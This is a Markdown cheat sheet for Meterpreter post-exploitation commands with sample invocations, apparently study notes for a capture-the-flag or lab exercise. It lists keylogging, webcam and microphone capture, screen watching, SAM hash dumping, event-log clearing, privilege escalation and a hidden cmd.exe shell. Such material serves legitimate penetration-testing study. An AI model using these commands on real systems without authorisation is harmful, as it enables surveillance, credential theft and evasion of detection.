## Core Commands

- `background` – Backgrounds the current session
- `exit` – Terminate the Meterpreter session
- `guid` – Get the session GUID (Globally Unique Identifier)
- `help` – Displays the help menu
- `info` – Displays information about a Post module
- `irb` – Opens an interactive Ruby shell on the current session
- `load` – Loads one or more Meterpreter extensions
- `migrate` – Migrate Meterpreter to another process
- `run` – Executes a Meterpreter script or Post module
- `sessions` – Quickly switch to another session

## File System Commands

- `cd` – Change directory
- `ls` (or `dir`) – List files in the current directory
- `pwd` – Print the current working directory
- `edit` – Edit a file
- `cat` – Show the contents of a file
- `rm` – Delete a file
- `search` – Search for files
- `upload` – Upload a file or directory
- `download` – Download a file or directory

## Networking Commands

- `arp` – Display the host ARP (Address Resolution Protocol) cache
- `ifconfig` – Display network interfaces
- `netstat` – Display network connections
- `portfwd` – Forward a local port to a remote service
- `route` – View and modify the routing table

## System Commands

- `clearev` – Clear event logs
- `execute` – Execute a command
- `getpid` – Show current process ID
- `getuid` – Show user Meterpreter is running as
- `kill` – Terminate a process
- `pkill` – Terminate processes by name
- `ps` – List running processes
- `reboot` – Reboot the remote computer
- `shell` – Open a system command shell
- `shutdown` – Shutdown the remote computer
- `sysinfo` – Get information about the remote system

## Other Commands

- `idletime` – Show how long the user has been idle
- `keyscan_dump` – Dump the keystroke buffer
- `keyscan_start` – Start capturing keystrokes
- `keyscan_stop` – Stop capturing keystrokes
- `screenshare` – Watch the remote desktop in real time
- `screenshot` – Grab a screenshot
- `record_mic` – Record audio from microphone
- `webcam_chat` – Start a video chat
- `webcam_list` – List webcams
- `webcam_snap` – Take a snapshot from a webcam
- `webcam_stream` – Play a webcam video stream
- `getsystem` – Attempt to elevate to local system
- `hashdump` – Dump SAM (Security Account Manager) database

---

## Core

- migrate 1234
- run post/windows/gather/enum_logged_on_users
- sessions -i 2
- load python

## fs

- cd C:\Windows\Temp
- cat C:\Windows\System32\drivers\etc\hosts
- edit notes.txt
- rm old.log
- search -f \*.pdf
- search -f flag2.txt
- upload tool.exe C:\Temp\tool.exe
- download secret.txt

## network

- portfwd add -l 8080 -p tcp -r 127.0.0.1 -L 80

## system

- kill 4321
- pkill chrome
- execute -f cmd.exe -i -H

## etc

- webcam_snap -i 1
- webcam_stream -i 1
- record_mic -d 10
